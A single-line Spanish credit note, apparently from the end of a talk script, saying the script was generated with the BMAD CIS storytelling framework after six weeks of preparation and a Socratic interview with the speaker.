*Guion generado usando el framework BMAD CIS de storytelling, con contexto de 6 semanas de preparación y entrevista socrática con el ponente.*
